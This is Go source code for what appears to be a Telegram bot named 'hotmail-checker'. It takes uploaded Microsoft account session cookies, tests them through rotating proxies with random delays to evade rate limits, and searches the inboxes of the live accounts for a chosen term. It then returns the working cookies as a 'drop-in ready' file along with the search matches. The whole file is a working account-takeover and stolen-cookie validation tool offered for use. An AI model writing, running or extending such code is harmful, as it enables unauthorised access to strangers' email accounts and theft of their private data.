package bot

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/GT56GT/hotmail-checker/internal/checker"
	"github.com/GT56GT/hotmail-checker/internal/job"

	"github.com/PaulSonOfLars/gotgbot/v2"
	"github.com/PaulSonOfLars/gotgbot/v2/ext"
)

// searchOutcome is the result of searching one account.
type searchOutcome struct {
	Email  string
	Items  []checker.SearchItem
	Method string
	Reason string
}

func (b *Bot) onMessage(bot *gotgbot.Bot, ctx *ext.Context) error {
	m := ctx.EffectiveMessage
	user := ctx.EffectiveUser
	if m == nil || user == nil {
		return nil
	}
	if b.cfg.IsBanned(user.Id) {
		return nil
	}

	text := strings.TrimSpace(m.Text)
	p := b.takePending(user.Id)

	if p.kind == pendingProxyAdd {
		return b.saveProxies(bot, m, user.Id, text)
	}

	if !looksLikeCookie(text) {
		_, err := m.Reply(bot, usageText, &gotgbot.SendMessageOpts{
			ParseMode: "Markdown",
			LinkPreviewOptions: &gotgbot.LinkPreviewOptions{
				IsDisabled: true,
			},
		})
		return err
	}

	term := ""
	if p.kind == pendingSearch {
		term = p.term
	}
	return b.startJob(bot, m, user.Id, text, term)
}

func (b *Bot) onDocument(bot *gotgbot.Bot, ctx *ext.Context) error {
	m := ctx.EffectiveMessage
	user := ctx.EffectiveUser
	if m == nil || user == nil || m.Document == nil {
		return nil
	}
	if b.cfg.IsBanned(user.Id) {
		return nil
	}
	if m.Document.FileSize > maxDocBytes {
		_, err := m.Reply(bot, "File too large. Limit is 20 MB.", nil)
		return err
	}

	data, err := b.downloadFile(m.Document.FileId)
	if err != nil {
		slog.Warn("document download failed", "err", err)
		_, rerr := m.Reply(bot, "Could not download that file.", nil)
		return rerr
	}

	p := b.takePending(user.Id)
	if p.kind == pendingProxyAdd {
		return b.saveProxies(bot, m, user.Id, string(data))
	}

	term := ""
	if p.kind == pendingSearch {
		term = p.term
	}
	return b.startJob(bot, m, user.Id, string(data), term)
}

// startJob parses cookies, enforces limits, and runs the check. When term is
// non-empty every live account is searched after the check completes.
func (b *Bot) startJob(bot *gotgbot.Bot, m *gotgbot.Message, userID int64, text, term string) error {
	cookies, issues := checker.ParseBlock(text)

	if len(cookies) == 0 {
		msg := "No valid cookies found."
		if len(issues) > 0 {
			msg += "\n\n" + summariseIssues(issues)
		}
		_, err := m.Reply(bot, msg, nil)
		return err
	}

	// A zero cap means no limit; the upload size is the only bound.
	if b.cfg.MaxCookiesPerJob > 0 && len(cookies) > b.cfg.MaxCookiesPerJob {
		_, err := m.Reply(bot, fmt.Sprintf(
			"Too many accounts: %d. Limit is %d per job.", len(cookies), b.cfg.MaxCookiesPerJob), nil)
		return err
	}

	j, err := b.reg.Begin(context.Background(), userID, len(cookies))
	if err != nil {
		_, rerr := m.Reply(bot, friendlyRegistryError(err), nil)
		return rerr
	}
	defer b.reg.Finish(userID)

	headline := fmt.Sprintf("Queued %d account(s). Starting…", len(cookies))
	if term != "" {
		headline = fmt.Sprintf("Queued %d account(s). Checking, then searching inboxes for \"%s\"…", len(cookies), term)
	}

	status, err := m.Reply(bot, headline, nil)
	if err != nil {
		return err
	}

	b.runJob(bot, j, cookies, status, term)
	return nil
}

func (b *Bot) runJob(bot *gotgbot.Bot, j *job.Job, cookies []*checker.Cookie, status *gotgbot.Message, term string) {
	progressDone := make(chan struct{})
	var progressWG sync.WaitGroup
	progressWG.Add(1)
	go func() {
		defer progressWG.Done()
		b.progressLoop(bot, j, status, term, progressDone)
	}()

	work := make(chan *checker.Cookie)
	var workers sync.WaitGroup

	n := b.cfg.Concurrency
	if n > len(cookies) {
		n = len(cookies)
	}
	if n < 1 {
		n = 1
	}

	for i := 0; i < n; i++ {
		workers.Add(1)
		go func() {
			defer workers.Done()
			for ck := range work {
				if j.Ctx.Err() != nil {
					return
				}
				b.checkOne(j, ck)

				select {
				case <-time.After(jitter()):
				case <-j.Ctx.Done():
					return
				}
			}
		}()
	}

feed:
	for _, ck := range cookies {
		select {
		case work <- ck:
		case <-j.Ctx.Done():
			break feed
		}
	}
	close(work)
	workers.Wait()

	close(progressDone)
	progressWG.Wait()

	var searches []searchOutcome
	if term != "" && j.Ctx.Err() == nil {
		searches = b.runSearches(bot, j, status, term)
	}

	j.Done()
	b.deliver(bot, j, status, searches, term)
}

func (b *Bot) checkOne(j *job.Job, ck *checker.Cookie) {
	ctx, cancel := context.WithTimeout(j.Ctx, b.cfg.Timeout+10*time.Second)
	defer cancel()

	pool := b.pools.Pool(ctx, j.UserID)
	entry, release, err := pool.Acquire(ctx)
	if err != nil && pool != b.pools.Global() {
		pool = b.pools.Global()
		entry, release, err = pool.Acquire(ctx)
	}
	if err != nil {
		j.AddErr("pool: " + err.Error())
		return
	}
	defer release()

	res := b.chk.Check(ctx, ck, entry.URL)

	switch res.Verdict {
	case checker.Live:
		pool.Report(entry, true)
		j.AddHit(job.Hit{
			Email:   res.Email,
			Name:    res.Name,
			Cookie:  ck.Header(),
			Cookies: ck.Values,
			Proxy:   res.Proxy,
		})

	case checker.Dead:
		pool.Report(entry, true)
		j.AddDead(ck.Label())

	case checker.Challenged:
		// The session authenticated but needs consent or re-auth, so the proxy
		// is working — do not penalise it.
		pool.Report(entry, true)
		j.AddChallenged(res.Reason)

	case checker.RateLimited:
		pool.Report(entry, false)
		j.AddErr("rate limited")

	default:
		pool.Report(entry, false)
		j.AddErr(res.Reason)
	}
}

// runSearches queries the inboxes of live hits, capped at MAX_SEARCH_ACCOUNTS.
func (b *Bot) runSearches(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, term string) []searchOutcome {
	hits, _, _, _ := j.Results()
	if len(hits) == 0 {
		return nil
	}

	limit := b.cfg.MaxSearchAccounts
	if len(hits) < limit {
		limit = len(hits)
	}
	targets := hits[:limit]

	_, _, _ = status.EditText(bot, &gotgbot.EditMessageTextOpts{
		Text: fmt.Sprintf("Checking done. Searching %d inbox(es) for \"%s\"…", len(targets), term),
	})

	out := make([]searchOutcome, len(targets))
	sem := make(chan struct{}, 3)
	var wg sync.WaitGroup

	for i, h := range targets {
		wg.Add(1)
		go func(i int, h job.Hit) {
			defer wg.Done()

			select {
			case sem <- struct{}{}:
			case <-j.Ctx.Done():
				out[i] = searchOutcome{Email: h.Email, Reason: "cancelled"}
				return
			}
			defer func() { <-sem }()

			ctx, cancel := context.WithTimeout(j.Ctx, b.cfg.Timeout+20*time.Second)
			defer cancel()

			pool := b.pools.Pool(ctx, j.UserID)
			entry, release, err := pool.Acquire(ctx)
			if err != nil && pool != b.pools.Global() {
				pool = b.pools.Global()
				entry, release, err = pool.Acquire(ctx)
			}
			if err != nil {
				out[i] = searchOutcome{Email: h.Email, Reason: "pool: " + err.Error()}
				return
			}
			defer release()

			ck := &checker.Cookie{Values: h.Cookies}
			res := b.chk.Search(ctx, ck, entry.URL, term, b.cfg.SearchResultsLimit)

			out[i] = searchOutcome{
				Email:  h.Email,
				Items:  res.Items,
				Method: res.Method,
				Reason: res.Reason,
			}
		}(i, h)
	}
	wg.Wait()

	return out
}

func (b *Bot) progressLoop(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, term string, done <-chan struct{}) {
	t := time.NewTicker(3 * time.Second)
	defer t.Stop()

	var lastEdit time.Time

	for {
		select {
		case <-done:
			return
		case <-t.C:
			// Telegram allows roughly one edit per second per chat; stay under
			// it so the bot is not throttled mid-job.
			if time.Since(lastEdit) < 2*time.Second {
				continue
			}

			c := j.Counts()
			suffix := ""
			if term != "" {
				suffix = fmt.Sprintf("\nsearch \"%s\" after check", term)
			}
			text := fmt.Sprintf(
				"Checking…\n`%s` %d/%d\n\nlive %d · dead %d · challenge %d · error %d\nelapsed %s%s",
				bar(c.Done(), j.Total), c.Done(), j.Total,
				c.Live, c.Dead, c.Challenged, c.Errors,
				j.Elapsed().Round(time.Second), suffix,
			)

			if _, _, err := status.EditText(bot, &gotgbot.EditMessageTextOpts{
				Text:      text,
				ParseMode: "Markdown",
			}); err == nil {
				lastEdit = time.Now()
			}
		}
	}
}

func (b *Bot) deliver(bot *gotgbot.Bot, j *job.Job, status *gotgbot.Message, searches []searchOutcome, term string) {
	hits, dead, challenged, errs := j.Results()

	summary := fmt.Sprintf(
		"*Done* in %s\n\n✅ live %d\n❌ dead %d\n🔒 challenge %d\n⚠️ error %d\n\n%d checked",
		j.Elapsed().Round(time.Second), len(hits), len(dead), len(challenged), len(errs), j.Total,
	)
	if term != "" {
		summary += fmt.Sprintf("\n\n🔎 %d match(es) for \"%s\"", countMatches(searches), term)
	}

	if _, _, err := status.EditText(bot, &gotgbot.EditMessageTextOpts{
		Text:      summary,
		ParseMode: "Markdown",
	}); err != nil {
		slog.Debug("status edit failed", "err", err)
	}

	chatID := status.Chat.Id

	if len(hits) > 0 {
		_, err := bot.SendDocument(chatID,
			gotgbot.InputFileByReader(fmt.Sprintf("cookies_%s.txt", j.ID), strings.NewReader(buildCookieFile(hits))),
			&gotgbot.SendDocumentOpts{
				Caption: fmt.Sprintf("%d working cookie(s) — drop-in ready", len(hits)),
			})
		if err != nil {
			slog.Warn("send cookies file failed", "err", err)
		}
	} else {
		_, _ = bot.SendMessage(chatID, "No working cookies in this batch.", nil)
	}

	report := buildReport(hits, dead, challenged, errs, j)
	if _, err := bot.SendDocument(chatID,
		gotgbot.InputFileByReader(fmt.Sprintf("report_%s.txt", j.ID), strings.NewReader(report)),
		&gotgbot.SendDocumentOpts{
			Caption: "Full check report",
		}); err != nil {
		slog.Warn("send report failed", "err", err)
	}

	if term != "" {
		results := buildSearchFile(searches, term)
		if _, err := bot.SendDocument(chatID,
			gotgbot.InputFileByReader(fmt.Sprintf("search_%s.txt", j.ID), strings.NewReader(results)),
			&gotgbot.SendDocumentOpts{
				Caption: fmt.Sprintf("Inbox search — \"%s\" — %d match(es)", term, countMatches(searches)),
			}); err != nil {
			slog.Warn("send search file failed", "err", err)
		}
	}
}

func countMatches(searches []searchOutcome) int {
	n := 0
	for _, s := range searches {
		n += len(s.Items)
	}
	return n
}

func (b *Bot) downloadFile(fileID string) ([]byte, error) {
	f, err := b.client.GetFile(fileID, nil)
	if err != nil {
		return nil, err
	}

	url := fmt.Sprintf("https://api.telegram.org/file/bot%s/%s", b.client.Token, f.FilePath)

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	resp, err := b.http.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("getFile returned %d", resp.StatusCode)
	}
	return io.ReadAll(io.LimitReader(resp.Body, maxDocBytes))
}

func looksLikeCookie(s string) bool {
	for _, marker := range []string{"MSPAuth", "MSPProf", "ANON=", "RPSSecAuth", "__Host-MSAAUTHP"} {
		if strings.Contains(s, marker) {
			return true
		}
	}
	return false
}

func jitter() time.Duration {
	return time.Duration(200+rand.Intn(500)) * time.Millisecond
}

func friendlyRegistryError(err error) string {
	msg := err.Error()
	switch {
	case strings.Contains(msg, "cooldown"):
		return "Cooling down. " + msg
	case strings.Contains(msg, "already running"):
		return "A job is already running. Send /cancel to stop it."
	}
	return msg
}

func summariseIssues(issues []error) string {
	const max = 4
	var sb strings.Builder
	for i, err := range issues {
		if i >= max {
			fmt.Fprintf(&sb, "…and %d more\n", len(issues)-max)
			break
		}
		sb.WriteString("• " + err.Error() + "\n")
	}
	return strings.TrimSpace(sb.String())
}
